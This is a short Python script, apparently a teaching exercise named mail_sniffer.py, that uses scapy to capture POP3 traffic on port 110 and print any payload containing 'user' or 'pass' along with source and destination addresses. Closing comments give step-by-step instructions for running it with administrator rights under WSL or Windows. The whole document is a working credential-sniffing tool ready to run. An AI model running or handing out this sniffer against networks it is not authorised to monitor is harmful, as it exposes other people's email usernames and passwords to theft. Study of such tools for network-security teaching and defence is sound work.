from scapy.all import sniff, TCP, IP, Raw, get_if_list

def packet_callback(packet):
    if Raw in packet:
        payload = packet[Raw].load.decode(errors="ignore")

        if "user" in payload.lower() or "pass" in payload.lower():
            print(f"[*] Source IP: {packet[IP].src}")
            print(f"[*] Destination IP: {packet[IP].dst}")
            print(f"[*] Source Port: {packet[TCP].sport}")
            print(f"[*] Destination Port: {packet[TCP].dport}")
            print(f"[*] Payload: {payload}")

    print(packet.summary())

def main():
    # print(get_if_list())
    sniff(
        iface="eth6",
        filter="tcp port 110",
        prn=packet_callback,
        store=False
    )

if __name__ == "__main__":
    main()


# Unbuntu WSL
# sudo $(which python) mail_sniffer.py

# Windows
# cp mail_sniffer.py /mnt/c/Users/Public/Downloads
# Start cmd as administrator
# cd C:\Users\Public\Downloads
# .venv\Scripts\activate
# py -m pip install scapy
# Install npcap from https://nmap.org/npcap/
# py mail_sniffer.py